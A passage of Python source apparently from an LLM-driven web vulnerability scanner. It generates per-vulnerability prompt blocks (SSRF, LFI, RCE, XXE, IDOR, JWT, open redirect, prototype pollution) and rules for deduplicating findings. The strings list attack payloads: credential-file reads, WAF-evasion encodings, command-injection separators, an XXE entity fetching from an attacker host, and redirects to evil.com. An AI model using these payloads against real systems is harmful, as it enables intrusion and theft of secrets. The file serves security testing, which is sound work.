        Generate SSRF-specific context for WET→DRY deduplication.

        Args:
            stack: Normalized tech stack

        Returns:
            SSRF deduplication-focused context string
        """
        infrastructure = stack.get("raw_profile", {}).get("infrastructure", [])
        cloud_providers = self._detect_cloud_provider(infrastructure)

        context_parts = [
            "## TECHNOLOGY CONTEXT FOR SSRF DEDUPLICATION",
            f"- Cloud Providers: {', '.join(cloud_providers) if cloud_providers else 'None detected'}",
            "",
            "## SSRF DEDUPLICATION RULES",
            "",
            "### Target-Based Deduplication",
            "- Same parameter + same internal target = DUPLICATE",
            "- Same parameter + different internal targets = DIFFERENT",
            "- Different parameters = DIFFERENT",
            "",
            "### Scope Rules",
            "- Blind SSRF vs Reflected SSRF = DIFFERENT classes",
            "- Internal network access vs Cloud metadata = DIFFERENT severity",
            "- Same endpoint different protocols (http vs file) = DIFFERENT",
            "",
            "### Examples",
            "- /fetch?url=127.0.0.1 = /fetch?url=localhost → DUPLICATE (same target)",
            "- /fetch?url=169.254.169.254 ≠ /fetch?url=127.0.0.1 → DIFFERENT targets",
            "- param 'url' ≠ param 'src' → DIFFERENT parameters",
        ]

        return "\n".join(context_parts)

    # =========================================================================
    # LFI-SPECIFIC CONTEXT GENERATION
    # =========================================================================

    def generate_lfi_context_prompt(self, stack: Dict) -> str:
        """
        Generate LFI-specific 'Prime Directive' context block.

        This context helps the LLM focus on relevant LFI payloads
        based on the detected OS type and language.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted LFI-focused prompt section
        """
        server = stack.get("server", "Unknown")
        lang = stack.get("lang", "Unknown")
        waf = stack.get("waf")

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK (LFI CONTEXT)",
            f"- Web Server: {server}",
            f"- Backend Language: {lang}",
        ]

        # OS detection from server/language
        os_type = self._infer_os_from_stack(stack)
        prompt_parts.append(f"- Likely OS: {os_type}")

        if waf:
            prompt_parts.append(f"- WAF Detected: {waf}")

        prompt_parts.append("")
        prompt_parts.append("## LFI STRATEGIC IMPLICATIONS")

        # OS-specific targets
        if os_type == "Linux":
            prompt_parts.extend([
                "- Linux: Target /etc/passwd, /etc/shadow (if readable)",
                "- Linux: /proc/self/environ for environment variables",
                "- Linux: Log poisoning via /var/log/apache2/access.log",
                "- Linux: /proc/self/cmdline, /proc/self/fd/X for process info",
            ])
        elif os_type == "Windows":
            prompt_parts.extend([
                "- Windows: Target C:\\Windows\\win.ini, C:\\Windows\\System32\\drivers\\etc\\hosts",
                "- Windows: C:\\inetpub\\logs\\ for IIS logs",
                "- Windows: UNC path for SSRF combo: \\\\attacker\\share",
                "- Windows: web.config for ASP.NET config",
            ])

        # Language-specific vectors
        if lang == "PHP":
            prompt_parts.extend([
                "- PHP: Use wrappers (php://filter, php://input, data://)",
                "- PHP: php://filter/convert.base64-encode/resource=",
                "- PHP: Check for allow_url_include for RFI",
                "- PHP: expect:// wrapper for RCE if enabled",
            ])
        elif lang == "Java":
            prompt_parts.extend([
                "- Java: Check for XXE via file:// protocol",
                "- Java: WEB-INF/web.xml for configuration",
            ])
        elif lang == "Node.js":
            prompt_parts.extend([
                "- Node.js: package.json, .env files",
                "- Node.js: /proc/self/cwd for working directory",
            ])
        elif lang == "Python":
            prompt_parts.extend([
                "- Python: requirements.txt, settings.py",
                "- Python: /proc/self/environ for Django secrets",
            ])

        # WAF evasion
        if waf:
            prompt_parts.extend([
                f"- WAF PRESENT ({waf}): Use traversal bypasses",
                "  * Double encoding: %252e%252e%252f",
                "  * Null byte: ../../../etc/passwd%00",
                "  * Unicode: ..%c0%af..%c0%af",
            ])

        return "\n".join(prompt_parts)

    def _infer_os_from_stack(self, stack: Dict) -> str:
        """Infer OS from tech stack."""
        server = stack.get("server", "").lower()
        lang = stack.get("lang", "").lower()

        # Windows indicators
        if "iis" in server or "asp" in lang or ".net" in lang or "windows" in server:
            return "Windows"

        # Default to Linux (most common for web servers)
        return "Linux"

    def generate_lfi_dedup_context(self, stack: Dict) -> str:
        """
        Generate LFI-specific context for WET→DRY deduplication.

        Args:
            stack: Normalized tech stack

        Returns:
            LFI deduplication-focused context string
        """
        os_type = self._infer_os_from_stack(stack)
        lang = stack.get("lang", "generic")

        context_parts = [
            f"## TECHNOLOGY CONTEXT FOR LFI DEDUPLICATION (OS: {os_type})",
            f"- Detected Language: {lang}",
            "",
            "## LFI DEDUPLICATION RULES",
            "",
            "### File Target Deduplication",
            "- Same parameter + same file target = DUPLICATE",
            "- Same parameter + different files = DIFFERENT (unless same traversal depth)",
            "- Different parameters = DIFFERENT",
            "",
            "### Technique Deduplication",
            "- Direct LFI vs Wrapper-based = DIFFERENT techniques",
            "- php://filter vs php://input = DIFFERENT wrapper types",
            "- Absolute path vs Relative path = DIFFERENT (if both work)",
            "",
            "### Scope Rules",
            "- Same traversal depth reaching same file = DUPLICATE",
            "- ../../etc/passwd = ../../../etc/passwd (if same result) → DUPLICATE",
            "",
            "### Examples",
            "- /file?path=../etc/passwd = /file?path=....//etc/passwd → DUPLICATE",
            "- param 'file' ≠ param 'include' → DIFFERENT parameters",
            "- php://filter ≠ direct ../etc/passwd → DIFFERENT techniques",
        ]

        return "\n".join(context_parts)

    # =========================================================================
    # RCE-SPECIFIC CONTEXT GENERATION
    # =========================================================================

    def generate_rce_context_prompt(self, stack: Dict) -> str:
        """
        Generate RCE-specific 'Prime Directive' context block.

        This context helps the LLM focus on relevant RCE payloads
        based on the detected OS type and language.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted RCE-focused prompt section
        """
        lang = stack.get("lang", "Unknown")
        server = stack.get("server", "Unknown")
        waf = stack.get("waf")

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK (RCE CONTEXT)",
            f"- Backend Language: {lang}",
            f"- Web Server: {server}",
        ]

        os_type = self._infer_os_from_stack(stack)
        prompt_parts.append(f"- Likely OS: {os_type}")

        if waf:
            prompt_parts.append(f"- WAF Detected: {waf}")

        prompt_parts.append("")
        prompt_parts.append("## RCE STRATEGIC IMPLICATIONS")

        # OS-specific command syntax
        if os_type == "Linux":
            prompt_parts.extend([
                "- Linux: Use $(cmd), `cmd`, ; cmd, | cmd, && cmd",
                "- Linux: Blind RCE via sleep, ping, curl to callback",
                "- Linux: Shell paths: /bin/bash, /bin/sh, /usr/bin/sh",
                "- Linux: Common separators: ;, |, ||, &&, \\n, %0a",
            ])
        else:
            prompt_parts.extend([
                "- Windows: Use & cmd, | cmd, %COMSPEC% /c cmd",
                "- Windows: Blind RCE via ping -n, timeout /t",
                "- Windows: Shell: cmd.exe, powershell.exe",
                "- Windows: Separators: &, |, ||, &&",
            ])

        # Language-specific RCE vectors
        if lang == "PHP":
            prompt_parts.extend([
                "- PHP: system(), exec(), passthru(), shell_exec(), popen()",
                "- PHP: eval(), assert(), preg_replace with /e modifier",
                "- PHP: Deserialization via unserialize()",
            ])
        elif lang == "Python":
            prompt_parts.extend([
                "- Python: os.system(), subprocess.*, os.popen()",
                "- Python: eval(), exec(), pickle.loads()",
                "- Python: __import__('os').system('cmd')",
            ])
        elif lang == "Node.js":
            prompt_parts.extend([
                "- Node.js: child_process.exec(), spawn(), fork()",
                "- Node.js: eval(), new Function(), vm module",
                "- Node.js: Deserialization via node-serialize",
            ])
        elif lang == "Java":
            prompt_parts.extend([
                "- Java: Runtime.getRuntime().exec(), ProcessBuilder",
                "- Java: Deserialization vulnerabilities (ysoserial payloads)",
                "- Java: Expression Language injection (EL)",
            ])
        elif lang == "Ruby":
            prompt_parts.extend([
                "- Ruby: system(), exec(), `cmd`, %x{cmd}",
                "- Ruby: Kernel.eval(), Open3.capture3()",
                "- Ruby: YAML.load() deserialization",
            ])

        # WAF evasion
        if waf:
            prompt_parts.extend([
                f"- WAF PRESENT ({waf}): Use command obfuscation",
                "  * Variable substitution: ${IFS} instead of space",
                "  * Command splitting: w'h'o'a'm'i",
                "  * Encoding: base64 decode piped to shell",
            ])

        return "\n".join(prompt_parts)

    def generate_rce_dedup_context(self, stack: Dict) -> str:
        """
        Generate RCE-specific context for WET→DRY deduplication.

        Args:
            stack: Normalized tech stack

        Returns:
            RCE deduplication-focused context string
        """
        os_type = self._infer_os_from_stack(stack)
        lang = stack.get("lang", "generic")

        context_parts = [
            f"## TECHNOLOGY CONTEXT FOR RCE DEDUPLICATION (OS: {os_type})",
            f"- Detected Language: {lang}",
            "",
            "## RCE DEDUPLICATION RULES",
            "",
            "### Injection Point Deduplication",
            "- Same parameter + same injection point = DUPLICATE",
            "- Same parameter + different command separators = technique variants (keep best)",
            "- Different parameters = DIFFERENT",
            "",
            "### Technique Deduplication",
            "- Blind RCE vs Output RCE = DIFFERENT validation needs",
            "- Time-based vs OOB callback = DIFFERENT detection methods",
            "- Shell injection vs Code injection = DIFFERENT classes",
            "",
            "### Scope Rules",
            "- Same endpoint, same param = DUPLICATE",
            "- ;id vs |id vs `id` on same param = keep most reliable",
            "",
            "### Examples",
            "- /exec?cmd=;id = /exec?cmd=|id → DUPLICATE (same param)",
            "- param 'cmd' ≠ param 'input' → DIFFERENT parameters",
            "- Blind (sleep) vs Reflected (output) → DIFFERENT (keep both)",
        ]

        return "\n".join(context_parts)

    # =========================================================================
    # XXE-SPECIFIC CONTEXT GENERATION
    # =========================================================================

    def generate_xxe_context_prompt(self, stack: Dict) -> str:
        """
        Generate XXE-specific 'Prime Directive' context block.

        This context helps the LLM focus on relevant XXE payloads
        based on the detected language and XML parser.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted XXE-focused prompt section
        """
        lang = stack.get("lang", "Unknown")
        server = stack.get("server", "Unknown")
        waf = stack.get("waf")

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK (XXE CONTEXT)",
            f"- Backend Language: {lang}",
            f"- Web Server: {server}",
        ]

        # Infer XML parser
        parser = self._infer_xml_parser(lang)
        prompt_parts.append(f"- Likely XML Parser: {parser}")

        if waf:
            prompt_parts.append(f"- WAF Detected: {waf}")

        prompt_parts.append("")
        prompt_parts.append("## XXE STRATEGIC IMPLICATIONS")

        # Language-specific XXE vectors
        if lang == "PHP":
            prompt_parts.extend([
                "- PHP: libxml2 parser, check LIBXML_NOENT flag",
                "- PHP: expect:// wrapper for RCE if enabled",
                "- PHP: php://filter for source code disclosure",
                "- PHP: simplexml_load_string(), DOMDocument",
            ])
        elif lang == "Java":
            prompt_parts.extend([
                "- Java: DocumentBuilder, SAXParser, XMLReader",
                "- Java: Parameter entity for OOB data exfil",
                "- Java: jar:// protocol for SSRF",
                "- Java: XInclude attacks",
            ])
        elif lang == "Python":
            prompt_parts.extend([
                "- Python: lxml (vulnerable by default), xml.etree (safer)",
                "- Python: defusedxml blocks XXE (check if used)",
                "- Python: Check for entity expansion DoS (Billion Laughs)",
            ])
        elif lang == "ASP.NET" or lang == ".NET":
            prompt_parts.extend([
                "- .NET: XmlDocument, XmlReader, XmlTextReader",
                "- .NET: DtdProcessing must be enabled for XXE",
                "- .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Parse",
            ])
        elif lang == "Node.js":
            prompt_parts.extend([
                "- Node.js: xml2js (generally safe), libxmljs (vulnerable)",
                "- Node.js: sax-js does not process external entities",
                "- Node.js: Check for fast-xml-parser, xmldom",
            ])

        # Generic XXE payloads
        prompt_parts.extend([
            "",
            "## COMMON XXE TECHNIQUES",
            "- Internal entity: <!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
            "- Parameter entity: <!ENTITY % xxe SYSTEM 'http://attacker/xxe.dtd'>",
            "- OOB via DTD: External DTD with nested entities for exfil",
            "- Error-based: Non-existent file to leak path in error",
        ])

        return "\n".join(prompt_parts)

    def _infer_xml_parser(self, lang: str) -> str:
        """Infer XML parser from language."""
        parsers = {
            "PHP": "libxml2",
            "Java": "DocumentBuilder/SAX",
            "Python": "lxml/etree",
            "ASP.NET": "XmlDocument",
            ".NET": "XmlDocument",
            "Node.js": "xml2js/libxmljs",
            "Ruby": "Nokogiri/REXML",
            "Go": "encoding/xml",
        }
        return parsers.get(lang, "Unknown")

    def generate_xxe_dedup_context(self, stack: Dict) -> str:
        """
        Generate XXE-specific context for WET→DRY deduplication.

        Args:
            stack: Normalized tech stack

        Returns:
            XXE deduplication-focused context string
        """
        lang = stack.get("lang", "generic")
        parser = self._infer_xml_parser(lang)

        context_parts = [
            f"## TECHNOLOGY CONTEXT FOR XXE DEDUPLICATION",
            f"- Detected Language: {lang}",
            f"- Likely Parser: {parser}",
            "",
            "## XXE DEDUPLICATION RULES",
            "",
            "### Entity Type Deduplication",
            "- Same XML endpoint + same entity type = DUPLICATE",
            "- Internal entity vs External entity = DIFFERENT",
            "- Blind XXE vs Error-based XXE = DIFFERENT techniques",
            "- Different XML endpoints = DIFFERENT",
            "",
            "### Scope Rules",
            "- Same endpoint accepting XML = single vulnerability",
            "- Multiple XML endpoints = test each separately",
            "- Parameter entity vs General entity = DIFFERENT types",
            "",
            "### Examples",
            "- /api (file:///etc/passwd) = /api (file:///etc/shadow) → DUPLICATE",
            "- Internal entity ≠ OOB parameter entity → DIFFERENT techniques",
            "- /upload/xml ≠ /api/import → DIFFERENT endpoints",
        ]

        return "\n".join(context_parts)

    # =========================================================================
    # IDOR-SPECIFIC CONTEXT GENERATION
    # =========================================================================

    def generate_idor_context_prompt(self, stack: Dict) -> str:
        """
        Generate IDOR-specific 'Prime Directive' context block.

        This context helps the LLM focus on relevant IDOR testing strategies
        based on the detected framework and API patterns.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted IDOR-focused prompt section
        """
        lang = stack.get("lang", "Unknown")
        frameworks = stack.get("frameworks", [])
        server = stack.get("server", "Unknown")

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK (IDOR CONTEXT)",
            f"- Backend Language: {lang}",
            f"- Web Server: {server}",
        ]

        if frameworks:
            prompt_parts.append(f"- Frameworks: {', '.join(frameworks[:3])}")

        prompt_parts.append("")
        prompt_parts.append("## IDOR STRATEGIC IMPLICATIONS")

        # Framework-specific ID patterns
        frameworks_lower = [f.lower() for f in frameworks]
        if any("django" in f for f in frameworks_lower):
            prompt_parts.extend([
                "- Django: Sequential integer IDs common",
                "- Django: Check /api/v1/users/{id}, /api/objects/{pk}",
                "- Django: UUID support via django-uuid-pk",
            ])
        if any("rails" in f for f in frameworks_lower):
            prompt_parts.extend([
                "- Rails: Auto-increment IDs default",
                "- Rails: Check nested resources /users/{id}/posts/{id}",
                "- Rails: friendly_id gem may use slugs",
            ])
        if any("laravel" in f for f in frameworks_lower):
            prompt_parts.extend([
                "- Laravel: UUID or integer IDs, check route model binding",
                "- Laravel: Check /api/{resource}/{id}",
                "- Laravel: Eloquent models often expose sequential IDs",
            ])
        if any("spring" in f for f in frameworks_lower):
            prompt_parts.extend([
                "- Spring: JPA sequential IDs common",
                "- Spring: Check @PathVariable endpoints",
                "- Spring: REST controllers /api/{entity}/{id}",
            ])
        if any("express" in f or "node" in f for f in frameworks_lower):
            prompt_parts.extend([
                "- Express/Node: MongoDB ObjectIds (24 hex chars)",
                "- Express: Check route params /:id",
                "- Express: May use nanoid or cuid",
            ])

        # Generic IDOR guidance
        prompt_parts.extend([
            "",
            "## COMMON IDOR PATTERNS",
            "- Test ID types: sequential integers, UUIDs, encoded values",
            "- Check horizontal (same role) and vertical (privilege escalation)",
            "- Test ID-1, ID+1 from baseline value",
            "- Check for predictable patterns: base64, hex encoding",
            "- Test in cookies, headers (X-User-ID), and POST bodies",
        ])

        return "\n".join(prompt_parts)

    def generate_idor_dedup_context(self, stack: Dict) -> str:
        """
        Generate IDOR-specific context for WET→DRY deduplication.

        Args:
            stack: Normalized tech stack

        Returns:
            IDOR deduplication-focused context string
        """
        lang = stack.get("lang", "generic")
        frameworks = stack.get("frameworks", [])

        context_parts = [
            "## TECHNOLOGY CONTEXT FOR IDOR DEDUPLICATION",
            f"- Detected Language: {lang}",
            f"- Frameworks: {', '.join(frameworks[:3]) if frameworks else 'None detected'}",
            "",
            "## IDOR DEDUPLICATION RULES",
            "",
            "### Endpoint Deduplication",
            "- Same endpoint + same ID parameter = DUPLICATE",
            "- Same endpoint + different ID params (id vs user_id) = DIFFERENT",
            "- Different endpoints = DIFFERENT",
            "",
            "### Scope Rules",
            "- Horizontal vs Vertical IDOR = DIFFERENT severity",
            "- Same resource type accessed = DUPLICATE",
            "- Different resource types (user vs order) = DIFFERENT",
            "",
            "### Examples",
            "- /users/1 = /users/2 (IDOR confirmed) → single finding",
            "- param 'id' ≠ param 'user_id' → DIFFERENT parameters",
            "- /users/{id} ≠ /orders/{id} → DIFFERENT resources",
            "- Horizontal (user A→B) ≠ Vertical (user→admin) → DIFFERENT classes",
        ]

        return "\n".join(context_parts)

    # =========================================================================
    # JWT-SPECIFIC CONTEXT GENERATION
    # =========================================================================

    def generate_jwt_context_prompt(self, stack: Dict) -> str:
        """
        Generate JWT-specific 'Prime Directive' context block.

        This context helps the LLM focus on relevant JWT attacks
        based on the detected language and likely JWT library.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted JWT-focused prompt section
        """
        lang = stack.get("lang", "Unknown")
        frameworks = stack.get("frameworks", [])

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK (JWT CONTEXT)",
            f"- Backend Language: {lang}",
        ]

        if frameworks:
            prompt_parts.append(f"- Frameworks: {', '.join(frameworks[:3])}")

        # Infer JWT library
        jwt_lib = self._infer_jwt_library(lang)
        prompt_parts.append(f"- Likely JWT Library: {jwt_lib}")

        prompt_parts.append("")
        prompt_parts.append("## JWT STRATEGIC IMPLICATIONS")

        # Common JWT attacks
        prompt_parts.extend([
            "- Test algorithm confusion (RS256 → HS256)",
            "- Test 'none' algorithm bypass",
            "- Test weak secret brute-force (rockyou.txt)",
            "- Check for JWK injection in header",
            "- Check for jku/x5u header injection",
        ])

        # Language-specific JWT vulnerabilities
        if lang == "Node.js":
            prompt_parts.extend([
                "",
                "## NODE.JS JWT SPECIFICS",
                "- jsonwebtoken: Check for algorithm whitelist bypass (CVE-2015-9235)",
                "- jwt-simple: Vulnerable to alg:none by default",
                "- express-jwt: Check version for known vulnerabilities",
            ])
        elif lang == "Python":
            prompt_parts.extend([
                "",
                "## PYTHON JWT SPECIFICS",
                "- PyJWT: algorithms parameter required in v2+",
                "- PyJWT < 2.0: Vulnerable to alg:none",
                "- python-jose: Check for CVE-2016-7036",
            ])
        elif lang == "Java":
            prompt_parts.extend([
                "",
                "## JAVA JWT SPECIFICS",
                "- JJWT: Check for setSigningKey vs parseClaimsJws",
                "- nimbus-jose-jwt: Generally secure, check version",
                "- auth0 java-jwt: Check for algorithm confusion",
            ])
        elif lang == "PHP":
            prompt_parts.extend([
                "",
                "## PHP JWT SPECIFICS",
                "- firebase/php-jwt: Algorithm confusion possible",
                "- lcobucci/jwt: Check version for CVEs",
                "- Check for weak key entropy",
            ])
        elif lang == "Ruby":
            prompt_parts.extend([
                "",
                "## RUBY JWT SPECIFICS",
                "- ruby-jwt: Algorithm confusion CVE-2015-9235",
                "- jwt gem: Check verify option handling",
            ])

        return "\n".join(prompt_parts)

    def _infer_jwt_library(self, lang: str) -> str:
        """Infer JWT library from language."""
        libs = {
            "Node.js": "jsonwebtoken/jose",
            "Python": "PyJWT",
            "Java": "JJWT/nimbus-jose-jwt",
            "PHP": "firebase/php-jwt",
            "Ruby": "ruby-jwt",
            "ASP.NET": "System.IdentityModel.Tokens.Jwt",
            ".NET": "System.IdentityModel.Tokens.Jwt",
            "Go": "golang-jwt/jwt",
        }
        return libs.get(lang, "Unknown")

    def generate_jwt_dedup_context(self, stack: Dict) -> str:
        """
        Generate JWT-specific context for WET→DRY deduplication.

        Args:
            stack: Normalized tech stack

        Returns:
            JWT deduplication-focused context string
        """
        lang = stack.get("lang", "generic")
        jwt_lib = self._infer_jwt_library(lang)

        context_parts = [
            "## TECHNOLOGY CONTEXT FOR JWT DEDUPLICATION",
            f"- Detected Language: {lang}",
            f"- Likely JWT Library: {jwt_lib}",
            "",
            "## JWT DEDUPLICATION RULES",
            "",
            "### Attack Type Deduplication",
            "- Same endpoint + same attack type = DUPLICATE",
            "- Algorithm confusion vs None alg vs Weak secret = DIFFERENT attacks",
            "- Different endpoints using same JWT = test once (GLOBAL scope)",
            "",
            "### Scope Rules",
            "- JWT vulnerabilities are typically GLOBAL (affects all authenticated endpoints)",
            "- Single weak JWT = affects entire application",
            "- Different token types (access vs refresh) = DIFFERENT",
            "",
            "### Examples",
            "- alg:none on /api/user = alg:none on /api/admin → DUPLICATE (global)",
            "- Algorithm confusion ≠ Weak secret ≠ None algorithm → DIFFERENT attacks",
            "- Access token vuln ≠ Refresh token vuln → DIFFERENT tokens",
        ]

        return "\n".join(context_parts)

    # =========================================================================
    # OPEN REDIRECT-SPECIFIC CONTEXT GENERATION
    # =========================================================================

    def generate_openredirect_context_prompt(self, stack: Dict) -> str:
        """
        Generate Open Redirect-specific 'Prime Directive' context block.

        This context helps the LLM focus on relevant redirect bypass payloads
        based on the detected framework URL handling.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted Open Redirect-focused prompt section
        """
        lang = stack.get("lang", "Unknown")
        frameworks = stack.get("frameworks", [])
        waf = stack.get("waf")

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK (OPEN REDIRECT CONTEXT)",
            f"- Backend Language: {lang}",
        ]

        if frameworks:
            prompt_parts.append(f"- Frameworks: {', '.join(frameworks[:3])}")

        if waf:
            prompt_parts.append(f"- WAF Detected: {waf}")

        prompt_parts.append("")
        prompt_parts.append("## OPEN REDIRECT STRATEGIC IMPLICATIONS")

        # Framework-specific redirect handling
        frameworks_lower = [f.lower() for f in frameworks]
        if any("spring" in f for f in frameworks_lower):
            prompt_parts.extend([
                "- Spring: Check redirect: prefix, forward: prefix",
                "- Spring: RedirectView, RedirectAttributes",
                "- Spring: @RequestMapping redirect patterns",
            ])
        if any("django" in f for f in frameworks_lower):
            prompt_parts.extend([
                "- Django: Check 'next' parameter, LOGIN_REDIRECT_URL",
                "- Django: HttpResponseRedirect, redirect() shortcut",
                "- Django: is_safe_url() bypass attempts",
            ])
        if any("express" in f or "node" in lang.lower() for f in frameworks_lower):
            prompt_parts.extend([
                "- Express: res.redirect() with unvalidated input",
                "- Express: Check for URL parsing quirks",
            ])
        if any("laravel" in f for f in frameworks_lower):
            prompt_parts.extend([
                "- Laravel: redirect()->to(), Redirect::to()",
                "- Laravel: intended() method for login redirects",
            ])
        if any("rails" in f for f in frameworks_lower):
            prompt_parts.extend([
                "- Rails: redirect_to with :back or user input",
                "- Rails: URI.parse() bypass techniques",
            ])

        # Common bypass techniques
        prompt_parts.extend([
            "",
            "## COMMON BYPASS TECHNIQUES",
            "- Protocol-relative URLs: //evil.com",
            "- URL encoding bypasses: %2f%2fevil.com",
            "- Backslash confusion: /\\evil.com, \\\\evil.com",
            "- @ character: http://trusted.com@evil.com",
            "- Subdomain tricks: evil.com?.trusted.com",
            "- Unicode normalization: evil。com, evil%E3%80%82com",
            "- Null byte: http://evil.com%00.trusted.com",
        ])

        return "\n".join(prompt_parts)

    def generate_openredirect_dedup_context(self, stack: Dict) -> str:
        """
        Generate Open Redirect-specific context for WET→DRY deduplication.

        Args:
            stack: Normalized tech stack

        Returns:
            Open Redirect deduplication-focused context string
        """
        lang = stack.get("lang", "generic")

        context_parts = [
            "## TECHNOLOGY CONTEXT FOR OPEN REDIRECT DEDUPLICATION",
            f"- Detected Language: {lang}",
            "",
            "## OPEN REDIRECT DEDUPLICATION RULES",
            "",
            "### Parameter Deduplication",
            "- Same parameter + same endpoint = DUPLICATE",
            "- Different redirect params (url vs next vs return) = DIFFERENT",
            "- Different endpoints = DIFFERENT",
            "",
            "### Technique Deduplication",
            "- Same bypass technique variants = keep most reliable",
            "- Protocol-relative vs Full URL = technique variants",
            "- Encoding bypasses of same base payload = DUPLICATE",
            "",
            "### Scope Rules",
            "- Same redirect functionality = single vulnerability",
            "- Login redirect ≠ Logout redirect = DIFFERENT functions",
            "",
            "### Examples",
            "- /login?next=//evil = /login?next=%2f%2fevil → DUPLICATE (same bypass)",
            "- param 'url' ≠ param 'redirect' → DIFFERENT parameters",
            "- /login redirect ≠ /oauth/callback redirect → DIFFERENT endpoints",
        ]

        return "\n".join(context_parts)

    # =========================================================================
    # PROTOTYPE POLLUTION-SPECIFIC CONTEXT GENERATION
    # =========================================================================

    def generate_prototype_pollution_context_prompt(self, stack: Dict) -> str:
        """
        Generate Prototype Pollution-specific 'Prime Directive' context block.

        This context helps the LLM focus on relevant pollution payloads
        based on the detected Node.js framework.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted Prototype Pollution-focused prompt section
        """
        frameworks = stack.get("frameworks", [])
        lang = stack.get("lang", "Unknown")
        raw_profile = stack.get("raw_profile", {})
        tech_tags = [t.lower() for t in raw_profile.get("tech_tags", [])]

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK (PROTOTYPE POLLUTION CONTEXT)",
            f"- Backend Language: {lang}",
        ]

        # Detect Node.js specifics
        frameworks_lower = [f.lower() for f in frameworks]
        node_frameworks = [f for f in frameworks if any(x in f.lower() for x in ["express", "next", "nest", "koa", "fastify"])]
        if node_frameworks:
            prompt_parts.append(f"- Node.js Frameworks: {', '.join(node_frameworks)}")

        prompt_parts.append("")
        prompt_parts.append("## PROTOTYPE POLLUTION STRATEGIC IMPLICATIONS")

        # Core pollution techniques
        prompt_parts.extend([
            "- Test __proto__ pollution via JSON: {\"__proto__\": {\"admin\": true}}",
            "- Test constructor.prototype: {\"constructor\": {\"prototype\": {...}}}",
            "- Check for lodash.merge, jQuery.extend, deep-merge usage",
            "- Test query string pollution: ?__proto__[admin]=true",
        ])

        # Framework-specific guidance
        if any("express" in f for f in frameworks_lower):
            prompt_parts.extend([
                "",
                "## EXPRESS-SPECIFIC",
                "- Check body-parser, qs module settings",
                "- Extended query parser enables nested objects",
                "- Test middleware chain pollution",
            ])
        if "next" in " ".join(tech_tags) or "next" in " ".join(frameworks_lower):
            prompt_parts.extend([
                "",
                "## NEXT.JS-SPECIFIC",
                "- Server-side props pollution (getServerSideProps)",
                "- API routes pollution",
                "- Check for server component pollution",
            ])
        if any("nest" in f for f in frameworks_lower):
            prompt_parts.extend([
                "",
                "## NESTJS-SPECIFIC",
                "- DTOs may be vulnerable to pollution",
                "- Check class-transformer usage",
            ])

        # Gadget chains
        prompt_parts.extend([
            "",
            "## ESCALATION GADGETS",
            "- RCE via child_process.spawn options pollution",
            "- RCE via require() path manipulation",
            "- DoS via process.mainModule pollution",
            "- Auth bypass via isAdmin/role pollution",
        ])

        return "\n".join(prompt_parts)

    def generate_prototype_pollution_dedup_context(self, stack: Dict) -> str:
        """
        Generate Prototype Pollution-specific context for WET→DRY deduplication.

        Args:
            stack: Normalized tech stack

        Returns:
            Prototype Pollution deduplication-focused context string
        """
        frameworks = stack.get("frameworks", [])

        context_parts = [
            "## TECHNOLOGY CONTEXT FOR PROTOTYPE POLLUTION DEDUPLICATION",
            f"- Node.js Frameworks: {', '.join(frameworks[:3]) if frameworks else 'None detected'}",
            "",
            "## PROTOTYPE POLLUTION DEDUPLICATION RULES",
            "",
            "### Pollution Path Deduplication",
            "- Same endpoint + same pollution path = DUPLICATE",
            "- __proto__ vs constructor.prototype = technique variants (keep both initially)",
            "- Different endpoints = DIFFERENT (pollution may affect different code paths)",
            "",
            "### Scope Rules",
            "- Client-side vs Server-side = DIFFERENT vulnerability classes",
            "- Pollution in GET vs POST body = DIFFERENT vectors",
            "- Same merge function = GLOBAL scope (one vuln)",
            "",
            "### Examples",
            "- /api?__proto__[x]=1 = /api?constructor[prototype][x]=1 → variants",
            "- Client-side $.extend ≠ Server-side lodash.merge → DIFFERENT",
            "- /users endpoint ≠ /orders endpoint → DIFFERENT code paths",
        ]

        return "\n".join(context_parts)
